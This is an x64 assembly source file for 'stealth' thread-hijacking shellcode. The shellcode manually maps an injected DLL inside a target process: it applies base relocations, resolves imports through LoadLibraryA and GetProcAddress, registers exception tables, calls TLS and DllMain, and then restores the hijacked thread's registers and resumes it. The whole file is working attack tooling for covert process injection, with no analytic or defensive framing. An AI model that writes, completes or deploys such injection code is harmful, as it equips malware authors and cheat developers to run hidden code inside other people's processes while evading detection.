;******************************************************************************
;   Stealth Injection Shellcode for Thread Hijacking - V3 (Fixed)
;   
;   Assembled with: ml64.exe /c /Fo stealth_shellcode.obj stealth_shellcode.asm
;   
;   FIXES:
;   - Proper stack alignment (16-byte before every CALL)
;   - Shadow space (0x20 bytes) before EVERY function call
;   - Better TLS handling
;   - VEH installation for crash protection
;   - CFG consideration
;******************************************************************************

.CODE

;------------------------------------------------------------------------------
; HIJACK_CONTEXT structure offsets - MUST match stealth_shellcode.hpp!
;------------------------------------------------------------------------------
CTX_Lock                EQU 000h
CTX_Completed           EQU 004h
CTX_Result              EQU 008h
CTX_ErrorCode           EQU 00Ch

CTX_OriginalRip         EQU 010h
CTX_OriginalRsp         EQU 018h
CTX_OriginalRax         EQU 020h
CTX_OriginalRbx         EQU 028h
CTX_OriginalRcx         EQU 030h
CTX_OriginalRdx         EQU 038h
CTX_OriginalRsi         EQU 040h
CTX_OriginalRdi         EQU 048h
CTX_OriginalRbp         EQU 050h
CTX_OriginalR8          EQU 058h
CTX_OriginalR9          EQU 060h
CTX_OriginalR10         EQU 068h
CTX_OriginalR11         EQU 070h
CTX_OriginalR12         EQU 078h
CTX_OriginalR13         EQU 080h
CTX_OriginalR14         EQU 088h
CTX_OriginalR15         EQU 090h
CTX_OriginalRflags      EQU 098h

; XMM registers (volatile in x64 ABI)
CTX_OriginalXmm0        EQU 0A0h
CTX_OriginalXmm1        EQU 0B0h
CTX_OriginalXmm2        EQU 0C0h
CTX_OriginalXmm3        EQU 0D0h
CTX_OriginalXmm4        EQU 0E0h
CTX_OriginalXmm5        EQU 0F0h

; PE Image info
CTX_ImageBase           EQU 100h
CTX_ImageSize           EQU 108h
CTX_EntryPointRva       EQU 110h
CTX_RelocDirRva         EQU 118h
CTX_RelocDirSize        EQU 120h
CTX_ImportDirRva        EQU 128h
CTX_ImportDirSize       EQU 130h
CTX_OriginalImageBase   EQU 138h
CTX_TlsDirRva           EQU 140h
CTX_TlsDirSize          EQU 148h
CTX_ExceptionDirRva     EQU 150h
CTX_ExceptionDirSize    EQU 158h
CTX_LoadConfigDirRva    EQU 160h
CTX_LoadConfigDirSize   EQU 168h

; Function pointers
CTX_pLoadLibraryA       EQU 170h
CTX_pGetProcAddress     EQU 178h
CTX_pNtFlushInstructionCache EQU 180h
CTX_pLdrpHandleTlsData  EQU 188h
CTX_pRtlAddVectoredExceptionHandler EQU 190h
CTX_pRtlAddFunctionTable EQU 198h
CTX_pRtlInsertInvertedFunctionTable EQU 1A0h

; Stack frame layout (after prologue)
; RSP+0x00 to RSP+0x1F = shadow space for calls
; RSP+0x20 onwards = local variables
LOCAL_SHADOW_SIZE       EQU 20h
LOCAL_VAR_SIZE          EQU 40h
FRAME_SIZE              EQU LOCAL_SHADOW_SIZE + LOCAL_VAR_SIZE  ; 0x60

;------------------------------------------------------------------------------
; HijackShellcodeV2
; 
; Input:  RCX = pointer to HIJACK_CONTEXT  
; Output: Returns to OriginalRip after DllMain completes
;------------------------------------------------------------------------------
HijackShellcodeV2 PROC FRAME
    ; === Prologue with proper frame setup ===
    push    rbp
    .pushreg rbp
    mov     rbp, rsp
    .setframe rbp, 0
    
    ; Allocate stack: shadow(0x20) + locals(0x40) + saved regs(0x38) = 0x98
    ; Round up to maintain 16-byte alignment: 0xA0
    sub     rsp, 0A0h
    .allocstack 0A0h
    
    ; Save non-volatile registers we'll use
    mov     [rsp + 60h], rbx
    .savereg rbx, 60h
    mov     [rsp + 68h], rsi
    .savereg rsi, 68h
    mov     [rsp + 70h], rdi
    .savereg rdi, 70h
    mov     [rsp + 78h], r12
    .savereg r12, 78h
    mov     [rsp + 80h], r13
    .savereg r13, 80h
    mov     [rsp + 88h], r14
    .savereg r14, 88h
    mov     [rsp + 90h], r15
    .savereg r15, 90h
    
    .endprolog
    
    ; RCX = HIJACK_CONTEXT pointer
    mov     rbx, rcx                    ; RBX = context (preserved across calls)
    
    ; === Save XMM registers immediately (they're volatile) ===
    ; Context pointer must be 16-byte aligned for movaps
    movaps  xmmword ptr [rbx + CTX_OriginalXmm0], xmm0
    movaps  xmmword ptr [rbx + CTX_OriginalXmm1], xmm1
    movaps  xmmword ptr [rbx + CTX_OriginalXmm2], xmm2
    movaps  xmmword ptr [rbx + CTX_OriginalXmm3], xmm3
    movaps  xmmword ptr [rbx + CTX_OriginalXmm4], xmm4
    movaps  xmmword ptr [rbx + CTX_OriginalXmm5], xmm5

    ;==========================================================================
    ; STEP 1: Install VEH for crash protection (optional)
    ;==========================================================================
    mov     rax, [rbx + CTX_pRtlAddVectoredExceptionHandler]
    test    rax, rax
    jz      skip_veh
    
    ; We don't have an exception handler to install, skip for now
    ; Would need: mov rcx, 1 (first handler)
    ;             lea rdx, [our_exception_handler]
    ;             call rax
    
skip_veh:

    ;==========================================================================
    ; STEP 2: Process Relocations
    ;==========================================================================
    mov     rax, [rbx + CTX_ImageBase]
    sub     rax, [rbx + CTX_OriginalImageBase]
    mov     rsi, rax                    ; RSI = delta
    test    rsi, rsi
    jz      skip_reloc                  ; No relocation needed if delta == 0
    
    cmp     qword ptr [rbx + CTX_RelocDirSize], 0
    jz      skip_reloc
    
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_RelocDirRva] ; R12 = reloc block ptr
    mov     r13, r12
    add     r13, [rbx + CTX_RelocDirSize] ; R13 = reloc end

reloc_block_loop:
    cmp     r12, r13
    jae     skip_reloc
    
    mov     r14d, dword ptr [r12]       ; VirtualAddress (page RVA)
    mov     r15d, dword ptr [r12 + 4]   ; SizeOfBlock
    
    ; Skip if block is empty or just header
    cmp     r15d, 8
    jbe     next_reloc_block
    
    ; Calculate entry count = (SizeOfBlock - 8) / 2
    mov     ecx, r15d
    sub     ecx, 8
    shr     ecx, 1                      ; ECX = entry count
    lea     rdx, [r12 + 8]              ; RDX = first entry

reloc_entry_loop:
    test    ecx, ecx
    jz      next_reloc_block
    
    movzx   eax, word ptr [rdx]         ; Entry
    mov     edi, eax
    shr     edi, 12                     ; Type in upper 4 bits
    
    ; Only process IMAGE_REL_BASED_DIR64 (type 0xA)
    cmp     edi, 0Ah
    jne     skip_reloc_entry
    
    ; Apply: *(ImageBase + PageRVA + Offset) += Delta
    and     eax, 0FFFh                  ; Offset within page
    movsxd  rax, eax
    add     rax, r14                    ; + PageRVA
    add     rax, [rbx + CTX_ImageBase]  ; + ImageBase
    add     qword ptr [rax], rsi        ; += Delta

skip_reloc_entry:
    add     rdx, 2
    dec     ecx
    jmp     reloc_entry_loop

next_reloc_block:
    add     r12, r15                    ; Advance by SizeOfBlock
    jmp     reloc_block_loop

skip_reloc:

    ;==========================================================================
    ; STEP 3: Process Imports
    ;==========================================================================
    cmp     qword ptr [rbx + CTX_ImportDirSize], 0
    jz      skip_imports
    
    mov     r12, [rbx + CTX_ImageBase]
    add     r12, [rbx + CTX_ImportDirRva] ; R12 = import descriptor

import_descriptor_loop:
    mov     eax, dword ptr [r12 + 0Ch]  ; Name RVA
    test    eax, eax
    jz      skip_imports                ; Null Name = end of imports
    
    ; --- LoadLibraryA(DllName) ---
    movsxd  rcx, eax
    add     rcx, [rbx + CTX_ImageBase]  ; RCX = DLL name string
    ; Shadow space already allocated in frame
    call    qword ptr [rbx + CTX_pLoadLibraryA]
    test    rax, rax
    jz      import_fail
    mov     r14, rax                    ; R14 = module handle
    
    ; Get thunk arrays
    mov     eax, dword ptr [r12]        ; OriginalFirstThunk (INT)
    test    eax, eax
    jnz     have_oft
    mov     eax, dword ptr [r12 + 10h]  ; Use FirstThunk if no INT
have_oft:
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     r15, rax                    ; R15 = lookup thunk (INT)
    
    mov     eax, dword ptr [r12 + 10h]  ; FirstThunk (IAT)
    movsxd  rax, eax
    add     rax, [rbx + CTX_ImageBase]
    mov     rdi, rax                    ; RDI = IAT entry to fill

thunk_loop:
    mov     rax, qword ptr [r15]        ; Lookup entry
    test    rax, rax
    jz      next_import_descriptor
    
    ; Check ordinal flag (bit 63)
    bt      rax, 63
    jnc     import_by_name
    
    ; Import by ordinal
    movzx   edx, ax                     ; RDX = ordinal (arg2)
    jmp     call_getprocaddress

import_by_name:
    ; Import by name - RAX is RVA to IMAGE_IMPORT_BY_NAME
    add     rax, [rbx + CTX_ImageBase]
    add     rax, 2                      ; Skip Hint (WORD)
    mov     rdx, rax                    ; RDX = function name (arg2)

call_getprocaddress:
    mov     rcx, r14                    ; RCX = module handle (arg1)
    ; Shadow space already in frame
    call    qword ptr [rbx + CTX_pGetProcAddress]
    test    rax, rax
    jz      import_fail
    
    mov     qword ptr [rdi], rax        ; Store in IAT
    add     r15, 8                      ; Next lookup thunk
    add     rdi, 8                      ; Next IAT entry
    jmp     thunk_loop

next_import_descriptor:
    add     r12, 14h                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR)
    jmp     import_descriptor_loop

import_fail:
    mov     dword ptr [rbx + CTX_ErrorCode], 2  ; Import resolution error
    jmp     fail

skip_imports:

    ;==========================================================================
    ; STEP 4: Register Exception Handlers (for SEH support)
    ;==========================================================================
    mov     rax, [rbx + CTX_pRtlAddFunctionTable]
    test    rax, rax
    jz      skip_exception_handlers
    
    cmp     qword ptr [rbx + CTX_ExceptionDirSize], 0
    jz      skip_exception_handlers
    
    ; RtlAddFunctionTable(FunctionTable, EntryCount, BaseAddress)
    mov     rcx, [rbx + CTX_ImageBase]
    add     rcx, [rbx + CTX_ExceptionDirRva]  ; RCX = RUNTIME_FUNCTION array
    
    ; Calculate entry count = Size / sizeof(RUNTIME_FUNCTION) = Size / 12
    mov     rax, [rbx + CTX_ExceptionDirSize]
    xor     edx, edx
    mov     r8d, 12
    div     r8                          ; RAX = entry count
    mov     rdx, rax                    ; RDX = EntryCount
    
    mov     r8, [rbx + CTX_ImageBase]   ; R8 = BaseAddress
    call    qword ptr [rbx + CTX_pRtlAddFunctionTable]
    ; Ignore return value - non-critical

skip_exception_handlers:

    ;==========================================================================
    ; STEP 5: Process TLS
    ;==========================================================================
    mov     rax, [rbx + CTX_pLdrpHandleTlsData]
    test    rax, rax
    jz      skip_tls
    
    cmp     qword ptr [rbx + CTX_TlsDirSize], 0
    jz      skip_tls
    
    ; LdrpHandleTlsData takes LDR_DATA_TABLE_ENTRY*, not just ImageBase
    ; This is a simplified call that may not work for all cases
    ; For full TLS support, need to create a fake LDR_DATA_TABLE_ENTRY
    mov     rcx, [rbx + CTX_ImageBase]
    call    rax
    ; Ignore errors - TLS is optional

skip_tls:

    ;==========================================================================
    ; STEP 6: Flush Instruction Cache
    ;==========================================================================
    mov     rax, [rbx + CTX_pNtFlushInstructionCache]
    test    rax, rax
    jz      skip_flush
    
    ; NtFlushInstructionCache(ProcessHandle, BaseAddress, Length)
    mov     rcx, -1                     ; NtCurrentProcess()
    mov     rdx, [rbx + CTX_ImageBase]
    mov     r8, [rbx + CTX_ImageSize]
    call    rax

skip_flush:

    ;==========================================================================
    ; STEP 7: Call DllMain
    ;==========================================================================
    mov     rcx, [rbx + CTX_ImageBase]  ; hinstDLL
    mov     edx, 1                      ; fdwReason = DLL_PROCESS_ATTACH
    xor     r8, r8                      ; lpvReserved = NULL
    
    mov     rax, [rbx + CTX_ImageBase]
    add     rax, [rbx + CTX_EntryPointRva]
    
    ; Check if EntryPoint is 0 (DLL without entry point)
    cmp     qword ptr [rbx + CTX_EntryPointRva], 0
    jz      no_entrypoint
    
    call    rax
    mov     dword ptr [rbx + CTX_Result], eax
    jmp     done

no_entrypoint:
    mov     dword ptr [rbx + CTX_Result], 1  ; Success (no EP to call)
    jmp     done

fail:
    mov     dword ptr [rbx + CTX_Result], 0

done:
    ;==========================================================================
    ; Signal completion
    ;==========================================================================
    mov     dword ptr [rbx + CTX_Completed], 1
    
    ;==========================================================================
    ; Restore XMM registers
    ;==========================================================================
    movaps  xmm0, xmmword ptr [rbx + CTX_OriginalXmm0]
    movaps  xmm1, xmmword ptr [rbx + CTX_OriginalXmm1]
    movaps  xmm2, xmmword ptr [rbx + CTX_OriginalXmm2]
    movaps  xmm3, xmmword ptr [rbx + CTX_OriginalXmm3]
    movaps  xmm4, xmmword ptr [rbx + CTX_OriginalXmm4]
    movaps  xmm5, xmmword ptr [rbx + CTX_OriginalXmm5]
    
    ;==========================================================================
    ; Restore GPRs and return to original execution
    ;==========================================================================
    mov     rax, [rbx + CTX_OriginalRax]
    mov     rcx, [rbx + CTX_OriginalRcx]
    mov     rdx, [rbx + CTX_OriginalRdx]
    mov     rsi, [rbx + CTX_OriginalRsi]
    mov     rdi, [rbx + CTX_OriginalRdi]
    mov     r8,  [rbx + CTX_OriginalR8]
    mov     r9,  [rbx + CTX_OriginalR9]
    mov     r10, [rbx + CTX_OriginalR10]
    mov     r11, [rbx + CTX_OriginalR11]
    mov     r12, [rbx + CTX_OriginalR12]
    mov     r13, [rbx + CTX_OriginalR13]
    mov     r14, [rbx + CTX_OriginalR14]
    mov     r15, [rbx + CTX_OriginalR15]
    mov     rbp, [rbx + CTX_OriginalRbp]
    
    ; Setup return - restore RSP and push return address
    mov     rsp, [rbx + CTX_OriginalRsp]
    push    qword ptr [rbx + CTX_OriginalRip]
    
    ; Restore RBX last since we were using it
    mov     rbx, [rbx + CTX_OriginalRbx]
    
    ret     ; Jump to OriginalRip

HijackShellcodeV2 ENDP

;------------------------------------------------------------------------------
; End marker for size calculation
;------------------------------------------------------------------------------
HijackShellcodeV2End:

END
